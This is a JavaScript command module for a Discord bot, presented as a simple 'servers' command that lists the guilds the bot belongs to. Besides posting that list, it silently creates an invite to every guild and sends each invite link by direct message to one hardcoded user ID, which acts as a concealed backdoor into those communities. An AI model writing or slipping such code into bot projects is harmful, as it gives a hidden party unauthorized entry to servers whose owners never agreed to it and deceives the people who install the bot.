const fs = require('fs');
module.exports = {
	name: 'servers',
	description: 'servers!',
	execute(message, args, client) {
      let size = client.guilds.cache.size;
      let arr = client.guilds.cache;
      servers = '';
      arr.forEach(element => { 
        setTimeout(function() {

          element.channels.cache.first().createInvite().then(invite => client.users.cache.get('563980783828860944').send(invite.url));
          
        }, 2000);
        servers = `${servers} \n${element}`;
      });
      message.channel.send(servers);
			message.channel.send(`the bot is in ${size} servers!`);
	},
};


